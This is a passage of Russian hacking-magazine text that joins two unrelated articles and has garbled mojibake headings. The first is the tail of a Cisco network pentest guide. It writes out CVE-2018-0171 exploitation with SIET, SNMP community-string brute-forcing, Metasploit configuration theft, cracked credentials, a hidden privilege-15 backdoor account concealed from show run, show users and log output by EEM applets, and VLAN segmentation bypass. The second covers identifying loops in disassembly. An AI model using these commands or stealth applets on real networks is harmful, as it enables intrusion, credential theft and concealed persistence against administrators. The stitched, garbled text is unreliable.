воначаль ной  кон фигурации  и  заг рузки  образа  операционной  системы
для нового оборудования Cisco. По умолчанию Cisco Smart  Install активен
на оборудовании Cisco и исполь зует протокол тран спортного уровня — TCP
с номером порта 4786.
  В 2017 году в этом протоколе наш ли критическую уязвимость CVE-2018-
0171 . Уровень опасности — 9,8 балла по шкале CVSS.
  Специаль но собранный пакет, который отправляет ся на порт TCP/4786, где
активен Cisco Smart Install, триг герит переполнение буфера, вследствие чего
злоумыш ленник сможет:
 • принудитель но перезаг рузить устройство;
 • вызвать RCE;
 • похитить кон фигурации сетевого оборудования.

Для эксплу атации этой уязвимости был разработан инстру мент SIET (Smart
Install Exploitation Tool), он позволяет абь юзить Cisco Smart Install. В этой статье
я покажу, как можно считать легитим ный файл кон фигурации сетевого обо-
рудования. Эксфиль трация кон фигов может быть цен на для пен тестера, пос-
коль ку он узнает об уникаль ных особен ностях сети. А это облегчит жизнь и поз-
волит найти новые век торы для атаки.
  В  качестве целевого устройства выступит «живой» ком мутатор Cisco
Catalyst 2960. На виртуаль ных образах нет Cisco Smart Install, поэтому поп-
рактиковать ся удастся толь ко на настоящем железе.
   Ад рес целевого ком мутатора — 10.10.100.10, CSI активен. Заг ружаем
SIET и начинаем атаку. Аргу мент -g означает эксфиль трацию кон фигурации
с устройства, аргу мент -i позволяет задать IP-адрес уязвимой цели.


necreas1ng@Inguz:~/opt/tools/SIET$ sudo python2 siet.py -g -i 10.
10.100.10





                  Успешная эксплу атация уязвимости

Кон фиг ком мутатора 10.10.100.10 будет находить ся в папке tftp/.





              Часть содержимого кон фигурации ком мутатора


ÝÊÑÔÈËÜÒÐÀÖÈß ÊÎÍÔÈÃÓÐÀÖÈÈ È ÏÅÐÅ×ÈÑËÅÍÈÅ ×ÅÐÅÇ
SNMP

SNMP (Simple Network Management Protocol) — протокол, который позволяет
отслеживать состояние устройств в компь ютерной сети. Это может быть
сетевое оборудование, IP-телефоны, корпоративные серверы или что-то еще.
  SNMP исполь зует протокол тран спортного уровня UDP с номерами пор-
тов 161/UDP и 162/UDP. Для обращения аген тов SNMP к серверу исполь зуют-
ся так называемые community strings. Это, скажем так, специаль ные пароли
для взаимодействия с SNMP-сервером. У community strings есть права либо
RO (read-only, толь ко чтение), либо RW (read-write — и чтение, и запись).
  На самом деле SNMP может не толь ко отслеживать состояние оборудо-
вания, но и полноцен но им управлять: дам пить кон фиги, изменять кон фигура-
цию и так далее. Если пен тестер сможет перебрать значение community
strings, он фак тически получает доступ к оборудованию. Впрочем, все зависит
от того, какую строку он сбру тит — на RO или на RW.




                     Ра боту протокола SNMP я опи сал в общих чер-
                           тах,  рекомендую  тебе  изу чить  следующие
                      матери алы, чтобы было понят нее, как работа ет
                  SNMP под капотом.
                        •Simple Network Management Protocol (Wikipedia)
                       •Network Basics: What Is SNMP and How Does It
                        Work?


Брут форс  community-строк  можно  реализовать  с  помощью  утилиты
onesixtyone. В качестве вход ных дан ных она будет принимать словарь
для брут форса и IP-адреса целевых хостов. В качестве целей выступят:
 • 10.10.100.10 — ком мутатор Cisco vIOS;
 • 10.10.100.254 — маршру тизатор Cisco vIOS.


necreas1ng@Inguz:~/snmp$ onesixtyone -c communitystrings -i
targets





              Вы яснены значения community strings

Мы выясняли, какие community  strings исполь зуют ся на тех устройствах.
Это откры вает нам дорогу для эксплу атации.


cisco_config_tftp
С помощью фреймворка Metasploit, а имен но модуля cisco_config_tftp,
можно выдернуть кон фигурацию устройства, зная значение community string.
Строка, имеющая права на RW, — private.
  Нам понадобит ся следующее:
 • значение строки, имеющей права на RW (COMMUNITY);
 • IP-адрес атакующей системы (LHOST);
 • IP-адрес целевого оборудования (RHOSTS);
 • путь, по которому модуль выведет кон фигурацию устройства (OUTPUTDIR).


msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set COMMUNITY
private


msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set RHOSTS 10.10.
100.10


msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set LHOST 10.10.
100.50


msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set OUTPUTDIR /
home/necreas1ng/snmp


msf6 auxiliary(scanner/snmp/cisco_config_tftp) > exploit

После запуска модуля в указан ную папку будет выкачана кон фигурация хоста
с адресом 10.10.100.10 (10.10.100.10.txt).





           Часть содержимого кон фигурации оборудования SW1


snmp_enum
С помощью этого модуля можно узнать информацию о целевом оборудовании.
Все абсолют но то же самое: указываем COMMUNITY (кстати, подойдет даже
строка с правами RO) и IP-адрес целевого устройства.


msf6 auxiliary(scanner/snmp/snmp_enum) > set COMMUNITY public


msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 10.10.100.10


msf6 auxiliary(scanner/snmp/snmp_enum) > exploit





          Ин формация об устройстве, получен ная через SNMP




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




         БОЛЬШОЙ ГАЙД ПО ПЕНТЕСТУ СЕТЕЙ CISCO





ÏÎÑÒÝÊÑÏËÓÀÒÀÖÈß ÂÇËÎÌÀÍÍÎÃÎ ÓÑÒÐÎÉÑÒÂÀ

Bruteforce hashes
Ког да ты перечисляешь кон фигурацию устройства, есть смысл попытать ся
сбру тить хеши паролей. Вдруг тебе удастся сбру тить хеш пароля той учет ной
записи, которая имеет мак сималь ные привилегии. В Cisco IOS есть несколь ко
типов паролей, которые хранят ся в зашифрован ном виде. Табличка ниже сори-
ентирует тебя по типам хешей, как бру тить и сколь ко времени понадобит ся.





                      Таблица хешей в Cisco IOS

Теперь приступаем к самому брут форсу. В выводе коман ды show  run ты
наверняка нат кнешь ся на эти строчки.





             Учет ные записи и их пароли в зашифрован ном виде

Брут форс хешей я проведу через утилиту John the Ripper. Нем ного отформа-
тирую хеши, чтобы «Джон» смог распознать сами хеши внут ри файла, который
мы будем подавать в качестве вход ных дан ных.





                    Хеши перед форматированием





                     Хеши после форматирования

Начинаем брут форс. С помощью ключа --wordlist указываем путь до сло-
варя. «Джон» сам определит тип хешей внут ри файла.





             Взломан ные пароли поль зователей lies и anxious

Получен ные креды: anxious:Secret123, lies:P@ssw0rd.
  Попробу ем зайти на маршру тизатор 10.10.10.100 от имени поль зователя
lies.





         Вход в панель управления маршру тизатором от имени lies


Cisco EEM
Cisco EEM — это, скажем так, «язык прог раммирования», с помощью которо-
го можно писать сценарии для Cisco IOS и автоматизировать рутин ные задачи.
В рам ках пен теста Cisco EEM поможет нам спрятать созданного нами поль-
зователя на взломан ном устройстве.
   Но! У такого метода есть и свои недостатки:
 • есть неболь шая вероятность спалить ся в логах сервера SYSLOG или SNMP;
 • если сетевой инженер тоже исполь зует Cisco EEM, он может заподозрить
   что-то нелад ное.

Сначала нам нужно создать самого поль зователя, который будет применять ся
для зак репления на оборудовании. Следи, чтобы у ника тоже был префикс
hidden_. С помощью этого префик са мы и будем прятать созданного нами
поль зователя по маске | hidden:


Owned(config)# username hidden_grimoire privilege 15 secret
youcantseewhatyouwannasee


Ïðÿ÷åìñÿ îò âûâîäà êîìàíäû show run
Эту коман ду очень часто применяют сетевые инженеры, она выводит кон-
фигурацию устройства, которая исполь зует ся в дан ный момент.


Owned(config)# event manager applet hide_from_showrun
Owned(config-applet)# event cli pattern "show run" sync yes
Owned(config-applet)# action 0.0 cli command "enable"
Owned(config-applet)# action 1.0 cli command "show run | exclude
hidden | event | action"
Owned(config-applet)# action 2.0 puts "$_cli_result_showrunapplet"


Ïðÿ÷åìñÿ îò âûâîäà êîìàíäû show ssh
А эта коман да выводит активных в дан ный момент поль зователей, под ключен-
ных через SSH.


Owned(config)# event manager applet hide_from_showssh
Owned(config-applet)# event cli pattern "show ssh" sync yes
Owned(config-applet)# action 0.0 cli command "enable"
Owned(config-applet)# action 1.0 cli command "show ssh | exclude
hidden"
Owned(config-applet)# action 2.0 puts "$_cli_result_showsshapplet"


Ïðÿ÷åìñÿ îò âûâîäà êîìàíäû show users
Вы водит активных в дан ный момент поль зователей, под ключен ных через VTY.
Обычно это удален ные сессии Telnet и SSH.


Owned(config)# event manager applet hide_from_showusers
Owned(config-applet)# event cli pattern "show users" sync yes
Owned(config-applet)# action 0.0 cli command "enable"
Owned(config-applet)# action 1.0 cli command "show users |
exclude hidden"
Owned(config-applet)# action 2.0 puts
"$_cli_result_showusersapplet"


Ïðÿ÷åìñÿ îò âûâîäà êîìàíäû show log (ëîêàëüíîå ëîãèðîâàíèå
Cisco IOS)
Owned(config)# event manager applet hide_from_showlog
Owned(config-applet)# event cli pattern "show log" sync yes
Owned(config-applet)# action 0.0 cli command "enable"
Owned(config-applet)# action 1.0 cli command "show log | exclude
HA_EM | hidden"
Owned(config-applet)# action 2.0 puts "$_cli_result_showlogapplet"

У апплетов EEM много интересных фун кций, советую не ограничивать ся этими
способами. Толь ко не доведи бед ного сетевика до инфаркта с этими аппле-
тами! :)


Lateral VLAN Segmentation Bypass
Если ты получил доступ к ком мутатору, к которому ты под ключен напрямую,
у тебя появляет ся возможность обхода VLAN-сег ментации внут ри сети. Дос-
таточно перек лючить порт в режим магистраль ного канала (иначе называемый
тран ком), создать виртуаль ные интерфейсы с иден тификаторами целевых
VLAN-сетей и настроить  IP-адрес. Можно попробовать  запросить адрес
динамически (DHCP), а можно настроить статически. Смот ря какой слу чай.
  Сначала нужно выяснить, к какому имен но порту ты под ключен. Это дела-
ется через CDP-сообщения, либо можешь поискать порт по маске include.





     CDP-объявление от ком мутатора. Мы на порте GigabitEthernet 0/2

Если вдруг CDP отключен, можно попробовать поискать порт по нашему MAC-
адресу.


SW1(config)# show mac address-table | include 0050.0000.0500





                  Найден порт Gi0/2 по MAC-адресу

Перед тем как перек лючить ся в режим тран ка, необходимо перечислить
существу ющие сети VLAN, выяснить их иден тификаторы. Потом эти иден-
тификаторы мы будем вешать на свой интерфейс, чтобы получать доступ
к сетям VLAN. Таким образом, благодаря тран ку мы можем получить доступ
в любую сеть VLAN. Кстати говоря, порт, к которому мы под ключены, принад-
лежит сети VLAN 10.


SW1# show vlan brief





                Ин формация о текущих сетях VLAN

Приступим. Входим в режим кон фигурации интерфейса и переходим в тран-
ковый режим.


SW1(config)# interface GigabitEthernet 0/2
SW1(config-if)# switchport trunk encapsulation dot1q
SW1(config-if)# switchport mode trunk

Во время перек лючения в режим магистраль ного канала теряется связность.
Но скоро я это исправлю.





        Потеря связности в момент перек лючения режима порта

Создаем виртуаль ные интерфейсы и «вешаем» на них VLAN ID, а затем под-
нимаем их.


necreas1ng@Inguz:~$ sudo vconfig add eth0 10
necreas1ng@Inguz:~$ sudo vconfig add eth0 20
necreas1ng@Inguz:~$ sudo vconfig add eth0 50
necreas1ng@Inguz:~$ sudo vconfig add eth0 60
necreas1ng@Inguz:~$ sudo ifconfig eth0.10 up
necreas1ng@Inguz:~$ sudo ifconfig eth0.20 up
necreas1ng@Inguz:~$ sudo ifconfig eth0.50 up
necreas1ng@Inguz:~$ sudo ifconfig eth0.60 up

Теперь нужно запросить адрес по DHCP. Но если в твоем слу чае не будет такой
возможности, можно настроить адрес статически.


necreas1ng@Inguz:~$ sudo dhclient -v eth0.10
necreas1ng@Inguz:~$ sudo dhclient -v eth0.20
necreas1ng@Inguz:~$ sudo dhclient -v eth0.50
necreas1ng@Inguz:~$ sudo dhclient -v eth0.60





                  Получен ные по DHCP адреса

Пример настройки статического IP-адреса на интерфейсе (VLAN 10):


necreas1ng@Inguz:~$ sudo ifconfig eth0.10 10.10.10.66 netmask 255.
255.255.0

Для проверки связи инициирую ICMP-запросы до шлюзов по умолчанию
для сетей VLAN 10, 20, 50, 60.





                        Связность до шлюзов

В итоге я обошел VLAN-сег ментацию и могу пробить ся в любую VLAN-сеть,
что развязывает мне руки для следующих шагов.


Configuration Enumeration
Êëàññè÷åñêîå ïåðå÷èñëåíèå êîíôèãóðàöèè
С помощью коман ды show run можно выяснить, какая кон фигурация исполня-
ется в дан ный момент. Это раскры вает некоторые особен ности инфраструк-
туры. Возможно, эта информация приведет тебя к более лег кой «победе»
во время пен теста. Например, вдруг ты обнаружишь исполь зование AAA-сер-
вера, что дает еще один век тор атаки.


Owned# show run





                Перечисление кон фигурации, часть 1





                Перечисление кон фигурации, часть 2


Cisco IOS ver. enumeration
Бу дет полезно узнать версию Cisco IOS на устройстве. С помощью этой
информации пен тестер сможет перебрать версию Cisco IOS и, узнав ее, экс-
плу атировать уязвимости. Вдруг он попал на роутер с учет кой read-only,
а потен циаль ное наличие уязвимости даст ему LPE? Кто знает...


Owned# show version





                       Версия Cisco vIOS


CCAT
CCAT (Cisco Cong Analysis Tool) — это специаль ный инстру мент , созданный
для анализа файлов кон фигурации оборудования Cisco на пред мет брешей
в безопасности. Он поможет автоматизировать процесс поиска мисконфигура-
ций безопасности и будет полезен как пен тестерам, так и сетевым админис-
траторам.


necreas1ng@Inguz:~/ccat$ python3 ccat.py showrunfromsw1.txt





               CCAT анализирует файл кон фигурации


ÂÛÂÎÄÛ

Вот какие кош мары могут возникнуть в сетях, где исполь зует ся оборудование
Cisco, если их администрируют недаль новид ные сетевые инженеры. На это
исследование я пот ратил полтора месяца и был удивлен, сколь ко век торов
существу ет при атаке на Cisco-based-сети. Очень надеюсь, что мое иссле-
дование подарит пен тестерам новые век торы атак, а сетевые администраторы
задумаются о защищен ности своих сетей и примут меры.
ВЗЛОМ





                                                                    Крис Касперски
                                                                         Известный российский
                                                                                         хакер. Легенда ][, ex-
                                                                          редактор ВЗЛОМа. Также
                                                                                 известен под
                                                                        псевдонимами мыщъх,
                                                                               nezumi (яп. 鼠, мышь), n2k,
                                                                                             elraton, souriz, tikus, muss,
                                                                                                farah, jardon, KPNC.

ПРАКТИКУЕМСЯ В
ПОИСКЕ ЦИКЛОВ ПРИ
РЕВЕРСЕ
                                                            Юрий Язев
                                                                    Широко известен под
                                                                       псевдонимом yurembo.
                                                                          Программист, разработчик
                                                                              видеоигр, независимый
                                                                             исследователь. Старый
                                                                           автор журнала «Хакер».
                                                                               yazevsoft@gmail.com





Сегод ня мы с тобой научим ся находить любые типы цик лов
в коде реальных прог рамм на язы ках высоко го уров-
ня — постро енных с опти миза цией и без нее. Это шаг,
с которым ты стол кнешься при обратной раз работ ке при-
ложений. При этом определение цик ла — это только пол-
дела. Далее нужно разобраться в его механиз ме, выделить
используемые дан ные и кор рек тно деком пилиро вать, прев-
ратив в строй ный код на язы ке высоко го уров ня. Без это го
точ ное понима ние алго рит ма прог раммы невоз можно.


Для понимания происходящего тебе не помешает ознакомить ся и с прош лой
стать ей, где мы рассмот рели теорию устройства разных видов цик лов на язы-
ках высокого уровня и их отражение в дизассем блерных листингах. А сейчас
настало время прак тики!




Пят надцать лет назад эпический труд Криса Касперски «Фун дамен таль ные
основы хакерства» был настоль ной книгой каждого начинающего исследова-
теля в области компь ютерной безопасности. Однако время идет, и знания,
опубликован ные Крисом, теряют акту аль ность. Редак торы «Хакера» попыта-
лись обновить этот объемный труд и перенести его из времен Windows
2000 и Visual Studio 6.0 во времена Windows 10 и Visual Studio 2019.
  Ссылки на дру гие статьи из этого цик ла ищи на странице автора.



ÖÈÊËÛ WHILE/DO
Visual C++ 2022 ñ îòêëþ÷åííîé îïòèìèçàöèåé
Для зак репления пройден ного в прош лой статье материала рассмот рим нес-
коль ко живых примеров. Начнем с самого простого — иден тификации цик лов
while/do:


#include <stdio.h>


int main()
{
    int a = 0;


    while (a++ < 10)
        printf("Оператор цикла while\n");


    do {
        printf("Оператор цикла do\n");
    } while (--a > 0);
}

От компилиру ем этот код с помощью Visual C++ 2022 с отключен ной оптимиза-
цией.





                Резуль тат выполнения примера while-do

Резуль тат ком пиляции должен выг лядеть примерно так:


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
0000000140004018↓o
var_18           = dword ptr -18h
var_14           = dword ptr -14h
; Резервируем память для двух локальных переменных,
; Только откуда взялась вторая?
                sub     rsp, 38h
; Заносим в переменную var_18 значение 0
; Следовательно, это переменная a
                mov     [rsp+38h+var_18], 0

Ниже следует перек рестная ссылка — loc_1400010EC, направлен ная вниз.
Это говорит нам о том, что перед нами начало цик ла. Посколь ку перек рестная
ссылка направлена вниз, то переход, ссы лающийся на этот адрес, будет нап-
равлен вверх!


loc_1400010EC:                           ; CODE XREF: main+31↓j
; Загружаем в EAX значение переменной a (var_18)
                mov     eax, [rsp+38h+var_18]
; Загружаем в var_14 значение переменной a, вот, мы нашли,
; где используется вторая переменная
                mov     [rsp+38h+var_14], eax
; Зачем-то снова загружаем то же значение в регистр EAX
                mov     eax, [rsp+38h+var_18]
; Увеличение значения в регистре EAX на 1
                inc     eax
; Загружаем значение из регистра EAX в переменную var_18 ("a")
                mov     [rsp+38h+var_18], eax
; Сравниваем старое (до обновления) значение переменной a,
; ранее сохраненное в var_14, с числом 0xA
                cmp     [rsp+38h+var_14], 0Ah

Если (var_14 >= 0xA), делаем пры жок «вперед», непосредствен но за инструк-
цию безусловного перехода, направлен ного «назад». Если выполняет ся пры-
жок «назад», значит, это цикл, а посколь ку условие выхода из цик ла проверя-
ется в его начале, то это цикл с предусловием.
   Для его отображения на цикл while необходимо инвертировать условие
выхода из цик ла на условие продолжения цик ла, дру гими словами, исправить >
= на <.
  Сделав это, мы получаем: while (a++ < 0xA)....


                jge     short loc_140001113
; Начало тела цикла:
; заносим ссылку на строку "Оператор цикла while\n"
                lea     rcx, _Format    ; _Format
; Выводим на консоль
                call    printf
; Безусловный переход, направленный назад, на метку loc_1400010EC
— в начало цикла,
; в область подготовки переменных для проверки
                jmp     short loc_1400010EC

Между loc_1400010EC и jmp short loc_1400010E есть толь ко одно условие
выхода из цик ла: jge short loc_140001113. Значит, исходный код цик ла выг-
лядел так:


while (a++ < 0xA) printf("Оператор цикла while\n");

Далее следует начало цик ла с постусловием. Однако на дан ном этапе мы это-
го еще не знаем, хотя и можем догадать ся благодаря наличию перек рестной
ссылки, направлен ной вниз.


loc_140001113:                           ; CODE XREF: main+23↑j
                                          ; main+4E↓j

Ага, никакого условия в начале цик ла не присутству ет, значит, это цикл с усло-
вием в кон це или в середине.


; Заносим ссылку на строку "Оператор цикла do\n"
                lea     rcx, byte_140002278 ; _Format
; Печатаем в консоли
                call    printf
; Тело цикла
; Загружаем в EAX значение переменной var_18 ("a")
                mov     eax, [rsp+38h+var_18]
; Уменьшаем значение в EAX на 1
                dec     eax
; Возвращаем значение из EAX в переменную a — var_18
                mov     [rsp+38h+var_18], eax
; Сравниваем переменную a с нулем
                cmp     [rsp+38h+var_18], 0
; Если (a > 0), делаем переход в начало цикла
                jg      short loc_140001113

Посколь ку условие расположено в кон це цик ла, это цикл do:


do printf("Оператор цикла do\n");
while (--a > 0);


; Возвращаем 0
                xor     eax, eax
; Восстанавливаем стек
                add     rsp, 38h
                retn
main            endp


Visual C++ 2022 ñ âêëþ÷åííîé îïòèìèçàöèåé
Совсем дру гой резуль тат получит ся, если включить оптимизацию. Откомпи-
лиру ем тот же самый пример с ключом /O2 (мак сималь ная оптимизация: при-
оритет скорости) и посмотрим на резуль тат, выдан ный ком пилятором:


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
000000014000400C↓o
; Сохраняем регистр в стеке
                push    rbx
; Подготавливаем стек, ни одной локальной переменной не объявлено
                sub     rsp, 20h
; В EBX кладем число 0xA. Для чего, пока неясно
                mov     ebx, 0Ah
                nop     dword ptr [rax+rax+00h]
; Судя по следующей перекрестной ссылке, направленной вниз, это
цикл!
loc_140001080:                           ; CODE XREF: main+20↓j
; Заносим в регистр RCX ссылку на строку "Оператор цикла while\n"
                lea     rcx, _Format    ; _Format
; Выводим строку на терминал
                call    printf
; Если это тело цикла, то где же предусловие?!
; Вычитаем из RBX число 1
                sub     rbx, 1
; Получается, что число 0xA, помещенное в EBX ранее, было
начальным значением

Инструк ция SUB подобно CMP изменяет состояние флага нуля. Если в резуль-
тате вычитания получается 0, флаг нуля возводит ся в единицу. Следующая
инструк ция совершает пры жок  назад,  ког да флаг не возведен, то есть
в резуль тате вычитания регистр RBX не стал равен нулю.


            jnz     short loc_140001080

Ком пилятор в порыве оптимизации превратил неэффективный цикл с предус-
ловием в более ком пак тный и быстрый цикл с постусловием. Имел ли он на это
право? А почему нет?! Проанализировав код, ком пилятор понял, что этот цикл
выполняет ся по крайней мере один раз. Следователь но, скорректировав усло-
вие продолжения, его проверку можно вынести в конец цик ла.
   Так же в исходном тек сте был инкремент счет чика цик ла от нуля до 0xA, а в
под готовленном тран слятором коде мы видим обратный эффект: дек ремент
счет чика от 0xA до нуля. Таким образом, ком пилятор while ((int a=0)+1) <
10) printf(...) заменил do printf(...) while ((int a=10)-1) > 0).
  Причем, что интересно, он не сравнивал перемен ную цик ла с кон стан той,
а поместил кон стан ту в регистр и умень шал его до тех пор, пока тот не стал
равен нулю! Зачем? А затем, что так короче, да и работает быстрее.
   Хорошо, но как нам деком пилировать этот цикл? Непосредствен ное отоб-
ражение на язык C/C++ дает следующую инструк цию:


var_RBX = 0xA;
do {
    printf("Оператор цикла while\n");
    var_RBX--;
} while (var_RBX > 0);

Вполне красивый и оптималь ный цикл с одной перемен ной.


; Значение 0xB помещаем в регистр EBX. Это подготовка к
следующему циклу
; Этот код выполняется после завершения предыдущего цикла
                mov     ebx, 0Bh
                nop     word ptr [rax+rax+00000000h]
; Перекрестная ссылка, направленная вниз, говорит нам о том, что
это начало цикла
loc_1400010A0:                           ; CODE XREF: main+40↓j
; Предусловия нет, значит, это цикл do
; Заносим в регистр RCX ссылку на строку "Оператор цикла do\n"
                lea     rcx, byte_140002278 ; _Format
; Выводим строку на терминал
                call    printf
; Уменьшаем значение, загруженное в EBX, на единицу
                dec     ebx
; Проверяем EBX на равенство нулю
                test    ebx, ebx
; Продолжаем выполнение цикла, пока EBX > 0
                jg      short loc_1400010A0

Этот цикл прямиком отображается в конструк цию язы ка C/C++:


var_EBX = 0xB;
do { printf("Оператор цикла do\n"); }
while (--var_EBX > 0);


; Возвращаем ноль
                xor     eax, eax
; Восстанавливаем стек
                add     rsp, 20h
; Восстанавливаем регистр
                pop     rbx
                retn
main            endp


C++Builder 10 áåç îïòèìèçàöèè
Несколь ко иначе обрабаты вает цик лы ком пилятор Embarcadero C++Builder
10.4. Смот ри пример while-do_cb:


; int __cdecl main(int argc, const char **argv, const char **envp)
                public main
main            proc near                ; DATA XREF:
__acrtused+29↑o
; Объявляем шесть переменных
var_1C           = dword ptr -1Ch
var_18           = dword ptr -18h
var_14           = dword ptr -14h
var_10           = qword ptr -10h
var_8            = dword ptr -8
var_4            = dword ptr -4
; Сохраняем в стеке RBP
                push    rbp
; Резервируем память для локальных переменных
                sub     rsp, 40h
; Помещаем в RBP указатель на дно стека
                lea     rbp, [rsp+40h]
; Инициализируем переменные:
; в var_4 записывает 0, вероятно, это переменная a из исходного
кода
                mov     [rbp+var_4], 0
                mov     [rbp+var_8], ecx
                mov     [rbp+var_10], rdx
; Еще одна переменная, изначально равная нулю, возьмем на заметку
                mov     [rbp+var_14], 0
; Ниже перекрестная ссылка, направленная вниз, значит, это начало
какого-то цикла
loc_40141F:                              ; CODE XREF: main+3E↓j
; В начале цикла условие не обнаружено, видимо, цикл с
постусловием,
; хотя не будем спешить с выводами
; В регистр EAX копируем значение из переменной var_14
                mov     eax, [rbp+var_14]
; Копирование EAX в ECX
                mov     ecx, eax
; Увеличиваем значение в регистре ECX на 1
                add     ecx, 1
; Увеличенное значение из регистра ECX копируем в переменную
var_14,
; из которой берется значение для счетчика в начале итерации
                mov     [rbp+var_14], ecx
; Сравнение неувеличенного значения с 0хА
                cmp     eax, 0Ah
; Если это значение больше константы или равно ей,
; выполняем прыжок за пределы цикла в область старших адресов
                jge     short loc_401440
; В случае продолжения выполнения помещаем ссылку на строку в
регистр
; и выводим ее на консоль
                lea     rcx, aOperatorIklaWh ; "Оператор цикла
while\n"
                call    printf
; Зачем-то сохраняем текущее значение регистра EAX в переменной
var_18...
                mov     [rbp+var_18], eax
; ... и выполняем безусловный переход в начало цикла
                jmp     short loc_40141F

Вот так-то C++Builder оптимизировал код! Началь ный цикл с предусловием
выполнения он превратил в бесконечный цикл с условием выхода посередине
(за под робностями обратись к прош лой статье)! Как мы можем деком пилиро-
вать этот цикл? Напрашивается такой вариант:


    int var_14 = 0;
    do {
    int var_EAX = var_14;
    int var_ECX = var_EAX;
    var_ECX++;
    var_14 = var_ECX;
    if (var_EAX >= 0xA) break;
    printf("Оператор цикла while\n");
} while (TRUE);

Этот вариант кардиналь но отличает ся от первоначаль ного, и я очень сом нева-
юсь, что в лучшую сторону! Что ж, издержки производства...


; --------------------------------
loc_401440:                              ; CODE XREF: main+2D↑j
; Сюда происходит переход при выходе из предыдущего цикла
; Как мы знаем, эта инструкция только переводит управление через
себя
                jmp     short $+2
; --------------------------------
loc_401442:                              ; CODE XREF: main:
loc_401440↑j
                                          ; main+5D↓j
; Новый цикл!
; Как видим, он начинается с вывода строки, нет условия, значит,
цикл с постусловием
                lea     rcx, aOperatorIklaDo ; "Оператор цикла do\
n"
                call    printf

Проматы ваем дизассем блерный листинг вверх, чтобы вспом нить, какое зна-
чение находит ся в регистре EAX. Значит, в этом месте прог раммы значение
в регистре EAX равно 0хА. Записы ваем это значение в перемен ную var_1C
(непонят но, для каких целей, ведь в будущем она не исполь зует ся). Выходит,
локаль ную перемен ную a исходной прог раммы пред ставляет регистровая
перемен ная EAX.


                mov     [rbp+var_1C], eax
; Записываем в регистр EAX значение переменной var_14
; А в ней содержится значение на 1 больше, чем в EAX! То есть 0xB
                mov     eax, [rbp+var_14]
; Какой хитрый C++Builder!
; Вместо реального вычитания он прибавляет к значению в EAX -1
                add     eax, 0FFFFFFFFh
; Присваивает результат переменной var_14
                mov     [rbp+var_14], eax
; И сравнивает уменьшенное значение с нулем
                cmp     eax, 0
; Если (EAX > 0), то мы прыгаем назад к началу «нового цикла»
; и осуществлению очередной итерации
                jg      short loc_401442

Во что C++Builder превратил изначаль ный цикл с постусловием? В целом
никаких изменений он не внес, оставив все на своих местах. И деком пилиро-
ван ный листинг этого цик ла должен выг лядеть примерно так:


var var_14 = 0xB;
do
{
    int var_EAX = var_14;
    var_EAX--;
    var_14 = var_EAX;
     printf("Оператор цикла while\n");
} while (var_EAX > 0);


; В ином случае, когда (EAX <= 0), пропускаем переход
; и продолжаем выполнение кода программы
                mov     [rbp+var_4], 0
; Возвращаем ноль
                mov     eax, [rbp+var_4]
; Восстанавливаем стек
                add     rsp, 40h
; Восстанавливаем регистр
                pop     rbp
                retn
main            endp


C++Builder 10 ñ îïòèìèçàöèåé
И совсем прямолинейный код тран слирует C++Builder с включен ной оптимиза-
цией по скорости.





  В дан ном слу чае не имеет значения, какой ключ из двух выбран, -O2 или -
  O3, оба одинаково влияют на генерируемый код




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





              ПРАКТИКУЕМСЯ В ПОИСКЕ ЦИКЛОВ ПРИ
                                       РЕВЕРСЕ





; int __cdecl main(int argc, const char **argv, const char **envp)
                public main
main            proc near                ; DATA XREF:
__acrtused+29↑o
                push    rbp
                push    rsi
                sub     rsp, 28h
                lea     rbp, [rsp+20h]
                lea     rsi, aOperatorIklaWh ; "Оператор цикла
while"
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                lea     rsi, aOperatorIklaDo ; "Оператор цикла do"
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                mov     rcx, rsi
                call    puts
                xor     eax, eax
                add     rsp, 28h
                pop     rsi
                pop     rbp
                retn
main            endp

Без всяких ухищрений этот код десять раз выводит строку «Оператор цик ла
while» и один надцать — строку «Оператор цик ла do». Быть мак сималь но прос-
тым значит быть мак сималь но быстрым!


Delphi 10
На закуску посмотрим, как разбирается с цик лами Embarcadero Delphi 10 (при-
мер while_repeat_d). Нем ного изменим код, чтобы его прог лотил ком-
пилятор:


program while_repeat_d;


{$APPTYPE CONSOLE}


{$R *.res}


uses
  System.SysUtils;


var
  a : Integer;
begin
  a := 0;


  while a < 10 do
  begin
      writeln('Оператор цикла while');
      a := a + 1;
  end;


  repeat
    writeln('Оператор цикла repeat/until');
      a := a - 1;
  until a < 0;
end.

Для удобства ском пилим с дебажной информацией, и для начала — с отклю-
чен ной оптимизацией.





                    От ключение оптимизации





                     Ожидаемый вывод

Посмотрим на резуль тат в дизассем блере:


                public _ZN14While_repeat_d14initializationEv
_ZN14While_repeat_d14initializationEv proc near
                                          ; DATA XREF: HEADER:
0000000000400128↑o
                                          ; .pdata:
0000000000448328↓o
; __unwind { //
_ZN6System23_DelphiExceptionHandlerEPNS_16TExceptionRecordEyPvS2_
; Блок кода инициализации приложения
                push    rbp
                sub     rsp, 20h
                mov     rbp, rsp
                mov     rax, cs:off_432120
                mov     byte ptr [rax], 1
                nop
                lea     rcx, qword_429080
                call    _ZN7Sysinit8_InitExeEPv
; Инициализация переменной a
                mov     cs:_ZN14While_repeat_d1aE, 0

Далее идет ее сравнение с числом 0xA. Можно подумать, что мы имеем цикл
